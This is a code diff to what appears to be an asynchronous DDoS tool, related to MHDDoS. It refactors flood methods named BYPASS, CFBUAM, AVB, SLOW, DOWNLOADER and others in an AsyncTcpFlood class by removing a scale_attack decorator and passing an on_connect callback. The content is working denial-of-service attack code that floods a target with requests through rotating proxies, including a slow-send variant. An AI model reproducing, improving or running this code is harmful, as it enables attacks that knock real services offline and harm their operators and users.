@@ -34,7 +34,6 @@ from .proxies import ProxySet, NoProxySet
 
 from . import proto
 from . import proxy_tools as ProxyTools
-from .concurrency import scale_attack
 from .proto import FloodIO, FloodOp, FloodSpec
 from .referers import REFERERS
 from .useragents import USERAGENTS
@@ -927,13 +926,14 @@ class AsyncTcpFlood(HttpFlood):
         )
         return await self._generic_flood_proto(payload, on_connect)
 
-    @scale_attack(factor=3)
-    async def BYPASS(self) -> bool:
+    async def BYPASS(self, on_connect=None) -> bool:
         connector = self._proxies.pick_random_connector()
         packets_sent = 0
         timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
             self._stats.track_open_connection() # not exactly the connection though
+            if not on_connect.cancelled():
+                on_connect.set_result(True)
             try:
                 for _ in range(self._settings.requests_per_connection):
                     async with s.get(self._target.human_repr()) as response:
@@ -946,8 +946,7 @@ class AsyncTcpFlood(HttpFlood):
                 self._stats.track_close_connection()
         return packets_sent > 0
     
-    @scale_attack(factor=2)
-    async def CFBUAM(self) -> bool:
+    async def CFBUAM(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
 
@@ -960,9 +959,8 @@ class AsyncTcpFlood(HttpFlood):
                 if time() > deadline:
                     return
 
-        return await self._generic_flood_proto(_gen())
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
-    @scale_attack(factor=5)
     async def EVEN(self) -> bool:
         payload: bytes = self.generate_payload()
         packets_sent, packet_size = 0, len(payload)
@@ -989,8 +987,7 @@ class AsyncTcpFlood(HttpFlood):
             on_connect=on_connect
         )
 
-    @scale_attack(factor=5)
-    async def AVB(self) -> bool:
+    async def AVB(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
         delay: float = max(self._settings.requests_per_connection / 1000, 1)
@@ -1000,10 +997,9 @@ class AsyncTcpFlood(HttpFlood):
                 yield FloodOp.SLEEP, delay
                 yield FloodOp.WRITE, (packet, packet_size)
 
-        return await self._generic_flood_proto(_gen())
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
-    @scale_attack(factor=20)
-    async def SLOW(self) -> bool:
+    async def SLOW(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
         delay: float = self._settings.requests_per_connection / 15
@@ -1021,11 +1017,9 @@ class AsyncTcpFlood(HttpFlood):
                 yield FloodOp.WRITE, (keep, len(keep))
                 yield FloodOp.SLEEP, delay
 
-        return await self._generic_flood_proto(_gen())
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
-    # XXX: scale factor needs to be reworked from scratch to fit new algo
-    @scale_attack(factor=20)
-    async def DOWNLOADER(self) -> bool:
+    async def DOWNLOADER(self, on_connect=None) -> bool:
         packet: bytes = self.generate_payload()
         packet_size: int = len(packet)
         delay: float = self._settings.requests_per_connection / 15
@@ -1044,7 +1038,7 @@ class AsyncTcpFlood(HttpFlood):
                     #         https://github.com/MatrixTM/MHDDoS/blob/main/start.py#L910
             yield FloodOp.WRITE, (b'0', 1)
 
-        return await self._generic_flood_proto(_gen())
+        return await self._generic_flood_proto(_gen(), on_connect=on_connect)
 
     async def TCP(self, on_connect=None) -> bool:
         packet_size = 1024
